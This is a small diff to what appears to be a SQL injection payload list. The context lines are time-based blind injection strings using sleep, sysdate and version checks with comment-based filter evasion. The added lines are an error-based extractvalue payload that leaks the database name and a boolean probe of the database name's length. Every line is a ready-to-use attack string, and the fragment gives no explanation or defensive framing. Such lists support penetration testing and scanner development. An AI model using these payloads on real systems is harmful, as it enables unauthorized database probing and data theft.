@@ -2,3 +2,5 @@
 (select(0)from(select(sleep(25)))v)
 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 -if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)
+'and/**/extractvalue(1,concat(char(126),(select+database())))and'
+" AND (length(database())) = \"11 --+-"
